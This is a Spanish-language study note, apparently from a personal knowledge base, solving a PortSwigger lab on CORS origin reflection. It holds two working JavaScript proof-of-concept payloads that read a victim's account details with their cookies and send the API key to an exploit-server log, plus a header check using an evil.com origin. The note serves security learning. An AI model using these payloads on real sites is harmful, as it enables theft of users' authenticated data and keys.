---
aliases:
  - CORS - robar API key con Origin reflejado
  - origin reflection PoC
  - steal apikey origin reflection
tags:
  - vuln/cors
  - example
  - portswigger
---

# Ejemplo — Robar la API key con `Origin` reflejado (trusts all origins)

> Lab: [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack) · técnica → [[vulnerabilities/005-cors/cors|entry point]]

**Qué demuestra:** el server devuelve **tu** `Origin` tal cual en `Access-Control-Allow-Origin` + `Allow-Credentials: true`. El exploit server **ya es** un origen distinto, así que no hay que generar nada raro: un `<script>` directo con `fetch` alcanza.

## PoC — `fetch` con `credentials:'include'`

```html
<!-- Subir al exploit server → Store → Deliver exploit to victim -->
<script>
fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
  .then(r => r.text())
  .then(d => location = 'https://EXPLOIT.exploit-server.net/log?key=' + encodeURIComponent(d));
</script>
```

> `credentials: 'include'` es el equivalente moderno de `withCredentials = true`: hace que viajen las cookies de la víctima. Sin esto, la respuesta autenticada no se expone aunque el CORS esté mal.

## Variante — exfiltrar al `/log` del propio exploit server
Si el exploit server sirve el HTML, podés usar ruta relativa:
```html
<script>
fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
  .then(r => r.text())
  .then(d => location = '/log?key=' + encodeURIComponent(d));   // cae en el mismo Access log
</script>
```

## Verificación (Repeater)
```
Origin: https://evil.com
```
→ respuesta con `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` = 🎯.
